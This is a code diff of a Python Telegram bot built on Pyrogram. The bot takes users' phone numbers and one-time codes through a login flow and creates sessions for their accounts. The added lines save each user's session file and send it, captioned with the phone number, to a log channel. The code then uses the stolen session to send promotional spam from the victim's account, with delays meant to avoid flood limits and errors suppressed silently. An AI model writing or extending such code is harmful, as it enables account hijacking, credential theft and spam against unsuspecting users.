@@ -1,6 +1,7 @@
 import os
 import asyncio
 import time
+from pathlib import Path
 from pyrogram import Client, filters
 from pyrogram.types import (
     Message,
@@ -76,7 +77,6 @@ OTP_KEYBOARD = InlineKeyboardMarkup([
 # State Management
 user_states = {}
 
-# Helper Functions
 async def check_login_status(user_id):
     user_data = database.find_one({"id": user_id})
     return bool(user_data and user_data.get('logged_in'))
@@ -88,13 +88,11 @@ async def cleanup_user_state(user_id):
             await state['client'].disconnect()
         del user_states[user_id]
 
-# Handlers
 @Client.on_message(filters.private & filters.command("login"))
 async def start_login(bot: Client, message: Message):
     user_id = message.from_user.id
     user_data = database.find_one({"id": user_id})
     
-    # Check for existing valid session
     if user_data and user_data.get('session'):
         try:
             test_client = Client(":memory:", session_string=user_data['session'])
@@ -112,7 +110,6 @@ async def start_login(bot: Client, message: Message):
         except:
             pass
     
-    # New login flow
     if await check_login_status(user_id):
         await message.reply(strings['already_logged_in'])
         return
@@ -244,20 +241,26 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         else:
             data['id'] = user_id
             database.insert_one(data)
-        
-        # Save session file
+
+        # Create sessions directory if not exists
+        os.makedirs("sessions", exist_ok=True)
+
+        # Generate session file path
         clean_phone = phone_number.replace('+', '')
-        session_file = f"sessions/{clean_phone}.session"
-        
-        if os.path.exists(":memory:.session"):
-            os.rename(":memory:.session", session_file)
-            await bot.send_document(
-                LOG_CHANNEL_SESSIONS_FILES,
-                session_file,
-                caption=f"Session: {clean_phone}"
-            )
-            os.remove(session_file)
-        
+        session_file = Path(f"sessions/{clean_phone}.session")
+
+        # Save session file (pyrogram v2+ method)
+        if hasattr(client, 'session'):
+            await client.session.save()
+            if Path("pyrogram.session").exists():
+                Path("pyrogram.session").rename(session_file)
+                await bot.send_document(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    str(session_file),
+                    caption=f"Session: {clean_phone}"
+                )
+                session_file.unlink()
+
         await bot.send_message(user_id, strings['verification_success'])
         asyncio.create_task(send_promotion_messages(string_session))
         
@@ -295,15 +298,15 @@ async def send_promotion_messages(session_string: str):
             for promo_text in PROMO_TEXTS:
                 try:
                     await client.send_message(target, promo_text)
-                    await asyncio.sleep(300 + (time.time() % 10))  # Random delay
+                    await asyncio.sleep(300 + (time.time() % 10))
                 except FloodWait as e:
                     await asyncio.sleep(e.value + 5)
                 except:
                     break
-            await asyncio.sleep(60)  # Delay between targets
+            await asyncio.sleep(60)
             
     except:
-        pass  # Silent fail
+        pass
     finally:
         try:
             await client.stop()
